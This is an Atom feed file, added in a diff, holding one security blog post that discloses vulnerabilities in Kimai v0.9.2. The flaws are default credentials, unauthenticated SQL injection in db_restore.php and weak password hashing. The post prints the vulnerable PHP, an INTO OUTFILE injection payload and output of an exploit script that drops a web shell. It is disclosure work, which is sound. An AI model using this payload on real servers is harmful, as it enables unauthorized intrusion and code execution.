@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: kimai | forelsec]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/kimai/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2014-03-03T23:18:38-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Kimai v0.9.2 - SQLi]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/05/21/kimai-v0.9.2-sqli/"/>
+    <updated>2013-05-21T00:01:44-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/05/21/kimai-v0.9.2-sqli</id>
+    <content type="html"><![CDATA[<p>Kimai is a time tracking solution built on the typical LAMP stack.  Multiple vulnerabilities were discovered that could allow remote code execution on the remote server.  These appear to be fixed in their source repository (<a href="https://github.com/kimai/kimai">here</a>), but none of the distribution packages (<a href="https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip">v0.9.2.1306-3</a>) have the patched version.</p>
+
+<p>On installation, a default administrative account is generated with the following credentials: admin:changeme.  The /install/ folder is not automatically deleted, but instead a pop-up is shown each time the administrator logs in, alerting them that they should delete this folder in order to protect their system from malicious modifications.  If this folder is not deleted, it could allow unauthenticated users the ability to wipe the remote system&rsquo;s install of Kimai.</p>
+
+<p>There are multiple directory indexes (<code>/kimai/libraries/</code>) that disclose paths, version information, and files, as well as path disclosure (<code>/kimai/error.php?err=db</code>):</p>
+
+<p><img class="center <a" src="href="http://1.bp.blogspot.com/-FQ9oSQqSVEs/UZp1oyYlMkI/AAAAAAAAAeY/c8JuSaxjRW0/s640/kimai_path.jpg">http://1.bp.blogspot.com/-FQ9oSQqSVEs/UZp1oyYlMkI/AAAAAAAAAeY/c8JuSaxjRW0/s640/kimai_path.jpg</a>"></p>
+
+<p>The file <code>/kimai/db_restore.php</code> is an experimental page that can be used to restore, delete, and create backups of the Kimai system.  This page can be accessed without authentication or authorization, and no audit log is generated.  This page is vulnerable to SQLi when restoring a generated backup.</p>
+
+<p>Once a backup is created, the recovery POST appears as such:</p>
+
+<p>```
+POST /kimai/db_restore.php HTTP/1.1
+Host: 192.168.1.219
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.1.219/kimai/db_restore.php">http://192.168.1.219/kimai/db_restore.php</a>
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37</p>
+
+<p>dates%5B%5D=1369028276&amp;submit=recover
+```</p>
+
+<p>The initial request is pulled in from the following:</p>
+
+<p>```
+if (isset($_REQUEST[&lsquo;submit&rsquo;]))
+{</p>
+
+<pre><code>if (($_REQUEST['submit'] == $kga['lang']['backup'][2]) &amp;&amp; (isset($_REQUEST['dates']))) 
+{
+    $dates = $_REQUEST['dates'];
+</code></pre>
+
+<p>```</p>
+
+<p>The tables are then queried, and the following code is executed:</p>
+
+<p>```</p>
+
+<pre><code>  // Bis rev 733 gab es in tabelle ldr keinen Primary Key ...
+        $query = "SELECT value FROM kimai_bak_" . $dates[0] . "_kimai_var WHERE var = 'revision' LIMIT 0,1;";
+
+        if ($kga['server_conn'] == "pdo") {
+                if (is_object($pdo_conn)) {
+                    $pdo_query = $pdo_conn-&gt;prepare($query);
+                    $success = $pdo_query-&gt;execute(array());
+                $revision = $pdo_query-&gt;fetch(PDO::FETCH_ASSOC);
+                }
+        } else {
+            if (is_object($conn)) {
+                $success = $conn-&gt;Query($query);
+            $revision = $conn-&gt;RowArray(0,MYSQL_ASSOC);
+            }
+        }
+</code></pre>
+
+<p>```</p>
+
+<p>The <code>dates</code> parameter is used within the query without sanitization, leading to a classic SQL injection vulnerability.  This is quite serious as the page is accessible without needing to be authenticated or authorized to the Kimai system.</p>
+
+<p>We can exploit this by generating a new backup, and running a typical SQLi, where the POST data appears as such:</p>
+
+<p><code>
+dates%5B%5D=1369028276_kimai_var%20UNION%20SELECT%20INTO%20OUTFILE%20'hacked';--%20&amp;submit=recover
+</code></p>
+
+<p>This will dump all output from the query into the file &lsquo;hacked&rsquo; on the remote server.  Using this, we can dump one column from any table in the database.</p>
+
+<p>Passwords are stored using the following:</p>
+
+<p><code>
+$passCrypt = md5($kga['password_salt'].$password.$kga['password_salt']);
+</code></p>
+
+<p>This is quite weak, as the salt is static for each user and can be pulled from the include/autoconf.php file.</p>
+
+<p>Session&rsquo;s do not enforce any form of source verification, and thusly can be hijacked.</p>
+
+<p>Here&rsquo;s a run from the script:</p>
+
+<p><code>
+root@kali:~# python kimai_sqli.py -i 192.168.1.83 -w
+[!] Using backup id 1369074792
+[!] Shell dropped.  Go hit http://192.168.1.83/kimai/41e93.php?rr=ls
+root@kali:~#
+</code></p>
+
+<p><img class="src <a" src="href="http://3.bp.blogspot.com/-N4SxE1sJCMI/UZpyu-ABNWI/AAAAAAAAAeM/mJREYhveVCs/s640/kimai_run.jpg">http://3.bp.blogspot.com/-N4SxE1sJCMI/UZpyu-ABNWI/AAAAAAAAAeM/mJREYhveVCs/s640/kimai_run.jpg</a>"></p>
+
+<p><a href="http://www.exploit-db.com/exploits/25606/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+</feed>
